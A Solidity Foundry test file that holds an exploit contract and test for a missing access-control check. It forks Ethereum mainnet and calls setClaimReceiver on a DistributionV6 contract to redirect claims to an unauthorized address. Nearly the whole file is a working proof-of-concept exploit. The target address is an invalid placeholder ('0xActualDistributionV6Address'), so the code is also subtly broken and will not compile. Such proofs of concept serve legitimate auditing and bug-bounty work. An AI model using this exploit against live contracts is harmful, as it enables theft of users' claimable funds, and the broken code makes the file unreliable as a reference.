// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IDistributionV6 {
    function setClaimReceiver(address newReceiver) external;
    function getClaimReceiver() external view returns (address);
}

contract AccessControlExploit {
    IDistributionV6 public target;
    address public attacker;

    constructor(address _target) {
        target = IDistributionV6(_target);
        attacker = msg.sender;
    }

    function exploitSetClaimReceiver(address newReceiver) external {
        target.setClaimReceiver(newReceiver);
    }
}

contract DistributionV6Test is Test {
    IDistributionV6 target;
    AccessControlExploit exploit;
    address public attacker = address(0x123);
    address public unauthorizedReceiver = address(0x456);

    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com");
        target = IDistributionV6(0xActualDistributionV6Address);
        exploit = new AccessControlExploit(address(target));
    }

    function testAccessControlExploit() public {
        // Initial claim receiver
        address initialReceiver = target.getClaimReceiver();
        assertEq(initialReceiver, address(0), "Initial claim receiver should be zero");

        // Exploit the vulnerability
        exploit.exploitSetClaimReceiver(unauthorizedReceiver);

        // Verify that the claim receiver has been changed
        address newReceiver = target.getClaimReceiver();
        assertEq(newReceiver, unauthorizedReceiver, "Claim receiver should be changed to unauthorized address");
    }
}